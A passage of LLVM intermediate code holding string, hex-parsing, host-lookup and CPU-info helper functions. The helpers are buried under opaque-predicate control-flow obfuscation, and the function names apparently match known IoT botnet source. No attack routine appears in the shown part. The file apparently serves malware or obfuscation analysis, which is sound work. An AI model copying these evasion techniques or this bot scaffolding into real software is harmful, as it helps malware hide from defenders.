  %137 = icmp eq i32* %136, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %28
  %138 = load i32*, i32** @fdopen_pids, align 8
  %139 = load i32, i32* %11, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds i32, i32* %138, i64 %140
  %142 = load i32, i32* %141, align 4
  %143 = icmp eq i32 %142, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %76
  %144 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %13, %struct.__sigset_t* null) #2
  %145 = load i32*, i32** @fdopen_pids, align 8
  %146 = load i32, i32* %12, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds i32, i32* %145, i64 %147
  store i32 0, i32* %148, align 4
  %149 = load i32, i32* %16, align 4
  %150 = icmp eq i32 %149, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %108
  store i32 %109, i32* %10, align 4
  br label %originalBB10
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.23
  %5 = load i32, i32* @y.24
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  store i32 1, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %17 = load i32, i32* @x.23
  %18 = load i32, i32* @y.24
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %75, %originalBBpart2
  %26 = load i32, i32* @x.23
  %27 = load i32, i32* @y.24
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %25
  %34 = load i32, i32* %15, align 4
  %35 = icmp eq i32 %34, 1
  %36 = load i32, i32* @x.23
  %37 = load i32, i32* @y.24
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %35, label %44, label %73

; <label>:44:                                     ; preds = %originalBBpart24
  %45 = load i32, i32* @x.23
  %46 = load i32, i32* @y.24
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %44
  %53 = load i32, i32* %16, align 4
  %54 = load i32, i32* %13, align 4
  %55 = icmp slt i32 %53, %54
  %56 = load i32, i32* @x.23
  %57 = load i32, i32* @y.24
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %55, label %64, label %73

; <label>:64:                                     ; preds = %originalBBpart28
  %65 = load i8*, i8** %12, align 8
  %66 = load i32, i32* %16, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  %69 = getelementptr inbounds i8, i8* %68, i64 -1
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp ne i32 %71, 10
  br label %73

; <label>:73:                                     ; preds = %64, %originalBBpart28, %originalBBpart24
  %74 = phi i1 [ false, %originalBBpart28 ], [ false, %originalBBpart24 ], [ %72, %64 ]
  br i1 %74, label %75, label %85

; <label>:75:                                     ; preds = %73
  %76 = load i32, i32* %14, align 4
  %77 = load i8*, i8** %12, align 8
  %78 = load i32, i32* %16, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %77, i64 %79
  %81 = call i64 @read(i32 %76, i8* %80, i64 1)
  %82 = trunc i64 %81 to i32
  store i32 %82, i32* %15, align 4
  %83 = load i32, i32* %16, align 4
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* %16, align 4
  br label %25

; <label>:85:                                     ; preds = %73
  %86 = load i32, i32* %15, align 4
  %87 = icmp eq i32 %86, 0
  br i1 %87, label %88, label %89

; <label>:88:                                     ; preds = %85
  br label %107

; <label>:89:                                     ; preds = %85
  %90 = load i32, i32* @x.23
  %91 = load i32, i32* @y.24
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %89
  %98 = load i8*, i8** %12, align 8
  %99 = load i32, i32* @x.23
  %100 = load i32, i32* @y.24
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %107

; <label>:107:                                    ; preds = %originalBBpart212, %88
  %108 = phi i8* [ null, %88 ], [ %98, %originalBBpart212 ]
  ret i8* %108

originalBBalteredBB:                              ; preds = %originalBB, %3
  %109 = alloca i8*, align 8
  %110 = alloca i32, align 4
  %111 = alloca i32, align 4
  %112 = alloca i32, align 4
  %113 = alloca i32, align 4
  store i8* %0, i8** %109, align 8
  store i32 %1, i32* %110, align 4
  store i32 %2, i32* %111, align 4
  store i32 1, i32* %112, align 4
  store i32 0, i32* %113, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %25
  %114 = load i32, i32* %15, align 4
  %115 = icmp eq i32 %114, 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %44
  %116 = load i32, i32* %16, align 4
  %117 = load i32, i32* %13, align 4
  %118 = icmp slt i32 %116, %117
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %89
  %119 = load i8*, i8** %12, align 8
  br label %originalBB10
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = load i32, i32* @x.25
  %3 = load i32, i32* @y.26
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  store i8* %0, i8** %10, align 8
  store i64 0, i64* %11, align 8
  %12 = load i32, i32* @x.25
  %13 = load i32, i32* @y.26
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %20

; <label>:20:                                     ; preds = %62, %originalBBpart2
  %21 = load i32, i32* @x.25
  %22 = load i32, i32* @y.26
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %20
  %29 = load i8*, i8** %10, align 8
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp ne i32 %31, 0
  %33 = load i32, i32* @x.25
  %34 = load i32, i32* @y.26
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %32, label %41, label %60

; <label>:41:                                     ; preds = %originalBBpart24
  %42 = load i32, i32* @x.25
  %43 = load i32, i32* @y.26
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %41
  %50 = load i64, i64* %11, align 8
  %51 = icmp sge i64 %50, 0
  %52 = load i32, i32* @x.25
  %53 = load i32, i32* @y.26
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %60

; <label>:60:                                     ; preds = %originalBBpart28, %originalBBpart24
  %61 = phi i1 [ false, %originalBBpart24 ], [ %51, %originalBBpart28 ]
  br i1 %61, label %62, label %72

; <label>:62:                                     ; preds = %60
  %63 = load i64, i64* %11, align 8
  %64 = shl i64 %63, 4
  %65 = load i8*, i8** %10, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %10, align 8
  %67 = load i8, i8* %65, align 1
  %68 = zext i8 %67 to i64
  %69 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %68
  %70 = load i64, i64* %69, align 8
  %71 = or i64 %64, %70
  store i64 %71, i64* %11, align 8
  br label %20

; <label>:72:                                     ; preds = %60
  %73 = load i64, i64* %11, align 8
  ret i64 %73

originalBBalteredBB:                              ; preds = %originalBB, %1
  %74 = alloca i8*, align 8
  %75 = alloca i64, align 8
  store i8* %0, i8** %74, align 8
  store i64 0, i64* %75, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %20
  %76 = load i8*, i8** %10, align 8
  %77 = load i8, i8* %76, align 1
  %78 = zext i8 %77 to i32
  %79 = icmp ne i32 %78, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %41
  %80 = load i64, i64* %11, align 8
  %81 = icmp sge i64 %80, 0
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %102 [
    i32 0, label %9
    i32 42, label %29
    i32 63, label %69
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i32, i32* @x.27
  %11 = load i32, i32* @y.28
  %12 = sub i32 %10, 1
  %13 = mul i32 %10, %12
  %14 = urem i32 %13, 2
  %15 = icmp eq i32 %14, 0
  %16 = icmp slt i32 %11, 10
  %17 = or i1 %15, %16
  br i1 %17, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %9
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  store i32 %20, i32* %3, align 4
  %21 = load i32, i32* @x.27
  %22 = load i32, i32* @y.28
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %140

; <label>:29:                                     ; preds = %2
  %30 = load i8*, i8** %4, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 1
  %32 = load i8*, i8** %5, align 8
  %33 = call i32 @wildString(i8* %31, i8* %32)
  %34 = icmp ne i32 %33, 0
  br i1 %34, label %35, label %65

; <label>:35:                                     ; preds = %29
  %36 = load i8*, i8** %5, align 8
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %63

; <label>:40:                                     ; preds = %35
  %41 = load i32, i32* @x.27
  %42 = load i32, i32* @y.28
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %40
  %49 = load i8*, i8** %4, align 8
  %50 = load i8*, i8** %5, align 8
  %51 = getelementptr inbounds i8, i8* %50, i64 1
  %52 = call i32 @wildString(i8* %49, i8* %51)
  %53 = icmp ne i32 %52, 0
  %54 = xor i1 %53, true
  %55 = load i32, i32* @x.27
  %56 = load i32, i32* @y.28
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart26, label %originalBB1alteredBB

originalBBpart26:                                 ; preds = %originalBB1
  br label %63

; <label>:63:                                     ; preds = %originalBBpart26, %35
  %64 = phi i1 [ false, %35 ], [ %54, %originalBBpart26 ]
  br label %65

; <label>:65:                                     ; preds = %63, %29
  %66 = phi i1 [ true, %29 ], [ %64, %63 ]
  %67 = xor i1 %66, true
  %68 = zext i1 %67 to i32
  store i32 %68, i32* %3, align 4
  br label %140

; <label>:69:                                     ; preds = %2
  %70 = load i8*, i8** %5, align 8
  %71 = load i8, i8* %70, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %98

; <label>:74:                                     ; preds = %69
  %75 = load i32, i32* @x.27
  %76 = load i32, i32* @y.28
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %74
  %83 = load i8*, i8** %4, align 8
  %84 = getelementptr inbounds i8, i8* %83, i64 1
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i64 1
  %87 = call i32 @wildString(i8* %84, i8* %86)
  %88 = icmp ne i32 %87, 0
  %89 = xor i1 %88, true
  %90 = load i32, i32* @x.27
  %91 = load i32, i32* @y.28
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart218, label %originalBB8alteredBB

originalBBpart218:                                ; preds = %originalBB8
  br label %98

; <label>:98:                                     ; preds = %originalBBpart218, %69
  %99 = phi i1 [ false, %69 ], [ %89, %originalBBpart218 ]
  %100 = xor i1 %99, true
  %101 = zext i1 %100 to i32
  store i32 %101, i32* %3, align 4
  br label %140

; <label>:102:                                    ; preds = %2
  %103 = load i8*, i8** %4, align 8
  %104 = load i8, i8* %103, align 1
  %105 = zext i8 %104 to i32
  %106 = call i32 @toupper(i32 %105) #10
  %107 = load i8*, i8** %5, align 8
  %108 = load i8, i8* %107, align 1
  %109 = zext i8 %108 to i32
  %110 = call i32 @toupper(i32 %109) #10
  %111 = icmp eq i32 %106, %110
  br i1 %111, label %112, label %136

; <label>:112:                                    ; preds = %102
  %113 = load i32, i32* @x.27
  %114 = load i32, i32* @y.28
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %112
  %121 = load i8*, i8** %4, align 8
  %122 = getelementptr inbounds i8, i8* %121, i64 1
  %123 = load i8*, i8** %5, align 8
  %124 = getelementptr inbounds i8, i8* %123, i64 1
  %125 = call i32 @wildString(i8* %122, i8* %124)
  %126 = icmp ne i32 %125, 0
  %127 = xor i1 %126, true
  %128 = load i32, i32* @x.27
  %129 = load i32, i32* @y.28
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart231, label %originalBB20alteredBB

originalBBpart231:                                ; preds = %originalBB20
  br label %136

; <label>:136:                                    ; preds = %originalBBpart231, %102
  %137 = phi i1 [ false, %102 ], [ %127, %originalBBpart231 ]
  %138 = xor i1 %137, true
  %139 = zext i1 %138 to i32
  store i32 %139, i32* %3, align 4
  br label %140

; <label>:140:                                    ; preds = %136, %98, %65, %originalBBpart2
  %141 = load i32, i32* %3, align 4
  ret i32 %141

originalBBalteredBB:                              ; preds = %originalBB, %9
  %142 = load i8*, i8** %5, align 8
  %143 = load i8, i8* %142, align 1
  %144 = zext i8 %143 to i32
  store i32 %144, i32* %3, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %40
  %145 = load i8*, i8** %4, align 8
  %146 = load i8*, i8** %5, align 8
  %147 = getelementptr inbounds i8, i8* %146, i64 1
  %148 = call i32 @wildString(i8* %145, i8* %147)
  %149 = icmp ne i32 %148, 0
  %_ = sub i1 %149, true
  %gen = mul i1 %_, true
  %_2 = sub i1 false, %149
  %gen3 = add i1 %_2, true
  %_4 = shl i1 %149, true
  %150 = xor i1 %149, true
  br label %originalBB1

originalBB8alteredBB:                             ; preds = %originalBB8, %74
  %151 = load i8*, i8** %4, align 8
  %152 = getelementptr inbounds i8, i8* %151, i64 1
  %153 = load i8*, i8** %5, align 8
  %154 = getelementptr inbounds i8, i8* %153, i64 1
  %155 = call i32 @wildString(i8* %152, i8* %154)
  %156 = icmp ne i32 %155, 0
  %_9 = sub i1 %156, true
  %gen10 = mul i1 %_9, true
  %_11 = shl i1 %156, true
  %_12 = shl i1 %156, true
  %_13 = sub i1 false, %156
  %gen14 = add i1 %_13, true
  %_15 = sub i1 false, %156
  %gen16 = add i1 %_15, true
  %157 = xor i1 %156, true
  br label %originalBB8

originalBB20alteredBB:                            ; preds = %originalBB20, %112
  %158 = load i8*, i8** %4, align 8
  %159 = getelementptr inbounds i8, i8* %158, i64 1
  %160 = load i8*, i8** %5, align 8
  %161 = getelementptr inbounds i8, i8* %160, i64 1
  %162 = call i32 @wildString(i8* %159, i8* %161)
  %163 = icmp ne i32 %162, 0
  %_21 = sub i1 false, %163
  %gen22 = add i1 %_21, true
  %_23 = sub i1 %163, true
  %gen24 = mul i1 %_23, true
  %_25 = sub i1 %163, true
  %gen26 = mul i1 %_25, true
  %_27 = shl i1 %163, true
  %_28 = sub i1 false, %163
  %gen29 = add i1 %_28, true
  %164 = xor i1 %163, true
  br label %originalBB20
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = load i32, i32* @x.29
  %4 = load i32, i32* @y.30
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca %struct.in_addr*, align 8
  %14 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %12, align 8
  store %struct.in_addr* %1, %struct.in_addr** %13, align 8
  %15 = load i8*, i8** %12, align 8
  %16 = call i32 @inet_addr(i8* %15) #2
  %17 = load %struct.in_addr*, %struct.in_addr** %13, align 8
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  store i32 %16, i32* %18, align 4
  %19 = icmp eq i32 %16, -1
  %20 = load i32, i32* @x.29
  %21 = load i32, i32* @y.30
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %19, label %28, label %45

; <label>:28:                                     ; preds = %originalBBpart2
  %29 = load i32, i32* @x.29
  %30 = load i32, i32* @y.30
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %28
  store i32 1, i32* %11, align 4
  %37 = load i32, i32* @x.29
  %38 = load i32, i32* @y.30
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %46

; <label>:45:                                     ; preds = %originalBBpart2
  store i32 0, i32* %11, align 4
  br label %46

; <label>:46:                                     ; preds = %45, %originalBBpart24
  %47 = load i32, i32* %11, align 4
  ret i32 %47

originalBBalteredBB:                              ; preds = %originalBB, %2
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca %struct.in_addr*, align 8
  %51 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %49, align 8
  store %struct.in_addr* %1, %struct.in_addr** %50, align 8
  %52 = load i8*, i8** %49, align 8
  %53 = call i32 @inet_addr(i8* %52) #2
  %54 = load %struct.in_addr*, %struct.in_addr** %50, align 8
  %55 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %54, i32 0, i32 0
  store i32 %53, i32* %55, align 4
  %56 = icmp eq i32 %53, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %28
  store i32 1, i32* %11, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %23, %1
  %4 = load i32, i32* @x.31
  %5 = load i32, i32* @y.32
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = load i8*, i8** %2, align 8
  %13 = load i8, i8* %12, align 1
  %14 = icmp ne i8 %13, 0
  %15 = load i32, i32* @x.31
  %16 = load i32, i32* @y.32
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %32

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i8*, i8** %2, align 8
  %25 = load i8, i8* %24, align 1
  %26 = zext i8 %25 to i32
  %27 = call i32 @toupper(i32 %26) #10
  %28 = trunc i32 %27 to i8
  %29 = load i8*, i8** %2, align 8
  store i8 %28, i8* %29, align 1
  %30 = load i8*, i8** %2, align 8
  %31 = getelementptr inbounds i8, i8* %30, i32 1
  store i8* %31, i8** %2, align 8
  br label %3

; <label>:32:                                     ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %33 = load i8*, i8** %2, align 8
  %34 = load i8, i8* %33, align 1
  %35 = icmp ne i8 %34, 0
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.42, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %162, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %164

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %162

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %55, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

; <label>:27:                                     ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

; <label>:32:                                     ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

; <label>:37:                                     ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  %39 = load i32, i32* @x.33
  %40 = load i32, i32* @y.34
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  %47 = load i32, i32* @x.33
  %48 = load i32, i32* @y.34
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %55, label %58

; <label>:55:                                     ; preds = %originalBBpart2
  %56 = load i8*, i8** %6, align 8
  %57 = getelementptr inbounds i8, i8* %56, i32 1
  store i8* %57, i8** %6, align 8
  br label %22

; <label>:58:                                     ; preds = %originalBBpart2
  br label %59

; <label>:59:                                     ; preds = %95, %58
  %60 = load i8*, i8** %6, align 8
  %61 = load i8*, i8** %6, align 8
  %62 = call i64 @strlen(i8* %61) #10
  %63 = sub i64 %62, 1
  %64 = getelementptr inbounds i8, i8* %60, i64 %63
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 13
  br i1 %67, label %77, label %68

; <label>:68:                                     ; preds = %59
  %69 = load i8*, i8** %6, align 8
  %70 = load i8*, i8** %6, align 8
  %71 = call i64 @strlen(i8* %70) #10
  %72 = sub i64 %71, 1
  %73 = getelementptr inbounds i8, i8* %69, i64 %72
  %74 = load i8, i8* %73, align 1
